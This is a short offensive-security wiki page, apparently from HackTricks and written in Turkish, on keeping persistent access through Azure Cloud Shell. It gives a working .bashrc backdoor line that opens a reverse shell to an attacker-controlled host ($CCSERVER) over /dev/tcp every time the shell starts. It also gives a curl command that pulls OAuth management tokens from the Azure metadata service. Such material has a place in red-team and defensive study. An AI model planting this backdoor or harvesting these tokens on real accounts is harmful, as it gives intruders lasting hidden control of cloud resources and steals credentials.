# Az - Cloud Shell Persistence

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell Persistence

Azure Cloud Shell, Azure kaynaklarını yönetmek için kalıcı depolama ve otomatik kimlik doğrulama ile komut satırı erişimi sunar. Saldırganlar, kalıcı ana dizine arka kapılar yerleştirerek bunu istismar edebilir:

* **Kalıcı Depolama**: Azure Cloud Shell’in ana dizini, bir Azure dosya paylaşımına monte edilir ve oturum sona erdikten sonra bile sağlam kalır.
* **Başlangıç Betikleri**: .bashrc gibi dosyalar, her oturumun başlangıcında otomatik olarak çalıştırılır ve bulut kabuğu başladığında kalıcı yürütmeye olanak tanır.

.bashrc içindeki örnek arka kapı:
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/$CCSERVER/443 0>&1 &)' >> $HOME/.bashrc
```
Bu arka kapı, kullanıcı tarafından bulut kabuğu tamamlandıktan 5 dakika sonra bile komutları çalıştırabilir.

Ayrıca Azure'un metadata hizmetinden örnek detayları ve token'lar için sorgu yapın:
```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -s
```
{{#include ../../../banners/hacktricks-training.md}}
